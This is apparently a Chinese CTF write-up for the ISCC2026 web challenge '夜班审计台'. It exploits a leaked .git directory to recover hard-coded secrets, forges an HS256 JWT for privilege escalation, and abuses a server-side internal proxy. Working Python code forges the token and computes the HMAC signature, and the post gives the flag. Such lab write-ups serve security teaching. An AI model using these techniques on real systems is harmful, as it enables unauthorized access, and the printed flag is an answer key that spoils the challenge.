+++
title = "夜班审计台"
date = "2026-05-06"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++
这题的核心是两段“夜班遗留逻辑”叠起来用：

1. `.git` 泄露拿源码历史
2. 历史源码里同时泄露了 JWT 调试密钥和内部接口签名密钥

**入口点**

访问首页后，先看前端脚本：

```http
GET /static/main.js
```

返回：

```js
document.addEventListener("DOMContentLoaded", () => {
  window.__buildTrace = "/.git/HEAD";
});
```

这基本就是明示去读 `.git`。

继续访问：

```http
GET /.git/HEAD
GET /.git/refs/heads/master
```

拿到分支头提交哈希，然后递归拉取 Git object，还原仓库历史。

**还原出的关键信息**

当前版本 `legacy_probe_stub.py` 里有：

```python
DEFAULT_AUDITOR = ("auditor", "audit2025")
INTERNAL_DEV_SECRET = "ISCC_2026_JWT_DEBUG_KEY_#9527"
JWT_ACCEPTED = ["RS256", "HS256"]
```

说明：
- 可以用 `auditor / audit2025` 登录
- 服务端接受 `HS256`
- 已知 `HS256` 密钥，可以伪造 JWT

同文件还提示：

```python
if night shift asks for old sign rule, inspect previous revision
```

前一个 revision 里有旧的内部签名逻辑：

```python
SERVER_SECRET = "ISCC_SERVER_SECRET_REAL"
LOCAL_ONLY = ("127.0.0.1", "::1")
AUDIT_NODE = "core-storage-01"

msg = f"{node_id}:{ts}"
expected = HMAC_SHA256_hex(SERVER_SECRET, msg)
```

这说明内部节点查询接口需要：
- `node_id`
- `ts`
- `sign = HMAC_SHA256(SERVER_SECRET, f"{node_id}:{ts}")`

而且 `LOCAL_ONLY` 不是问题，因为 `/auditor/nodes` 页面会“代你向内部审计进程发请求”，即服务端 SSRF/内部代理。

**利用步骤**

先正常登录一次，发现服务端发的是 `RS256` token，但 `role=user`，不能直接进审计页。

于是自己伪造一个 `HS256` JWT，把角色改成 `auditor`。

JWT 头和载荷大致如下：

```json
{"alg":"HS256","typ":"JWT"}
```

```json
{
  "sub":"auditor",
  "role":"auditor",
  "iat": <now>,
  "exp": <now+3600>,
  "iss": "夜班审计台"
}
```

签名密钥：

```text
ISCC_2026_JWT_DEBUG_KEY_#9527
```

然后带着这个伪造的 `audit_token` 访问：

```http
GET /auditor/nodes
```

成功进入审计员页面。

接着按旧逻辑计算内部查询签名：

- `node_id = core-storage-01`
- `ts = 当前秒级时间戳`
- `sign = HMAC_SHA256("ISCC_SERVER_SECRET_REAL", f"{node_id}:{ts}")`

提交到：

```http
POST /auditor/nodes
```

表单数据：

```text
node_id=core-storage-01
ts=<当前时间戳>
sign=<计算出的hex签名>
```

页面回显：

```text
node_id=core-storage-01, status=OK, flag=ISCC{K6FRFyHAMaMmPZNmXXpA}
```

**EXP 思路**

生成审计员 JWT：

```python
import base64, json, hmac, hashlib, time

secret = b'ISCC_2026_JWT_DEBUG_KEY_#9527'
header = {'alg':'HS256','typ':'JWT'}
payload = {
    'sub':'auditor',
    'role':'auditor',
    'iat': int(time.time()),
    'exp': int(time.time()) + 3600,
    'iss': '夜班审计台'
}

def b64u(x):
    return base64.urlsafe_b64encode(
        json.dumps(x, separators=(',',':'), ensure_ascii=False).encode()
    ).rstrip(b'=')

msg = b'.'.join([b64u(header), b64u(payload)])
sig = base64.urlsafe_b64encode(hmac.new(secret, msg, hashlib.sha256).digest()).rstrip(b'=')
token = (msg + b'.' + sig).decode()
print(token)
```

计算节点签名：

```python
import hmac, hashlib, time

node_id = 'core-storage-01'
ts = str(int(time.time()))
sign = hmac.new(
    b'ISCC_SERVER_SECRET_REAL',
    f'{node_id}:{ts}'.encode(),
    hashlib.sha256
).hexdigest()

print(ts, sign)
```

最后带 `Cookie: audit_token=<伪造JWT>` 提交表单即可。

**总结**

题目考点是：
- `.git` 泄露
- 从 Git 历史找被“删掉”的敏感逻辑
- JWT 算法/密钥滥用导致权限提升
- 服务端代发内部请求，绕过 `LOCAL_ONLY`

**Flag**

```text
ISCC{K6FRFyHAMaMmPZNmXXpA}
```
